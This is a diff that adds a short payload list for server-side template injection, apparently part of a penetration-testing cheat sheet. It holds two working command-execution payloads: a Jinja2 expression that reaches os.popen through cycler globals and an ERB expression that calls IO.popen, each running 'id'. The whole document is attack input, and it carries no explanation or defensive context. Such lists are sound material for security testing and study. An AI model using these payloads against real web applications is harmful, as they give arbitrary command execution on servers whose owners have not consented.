@@ -1,0 +1,5 @@
+# Python Jinja - execute command
+{{cycler.__init__.__globals__.os.popen("id").read()}}
+
+# Ruby ERB - execute command
+<%= IO.popen("id").readlines() %>
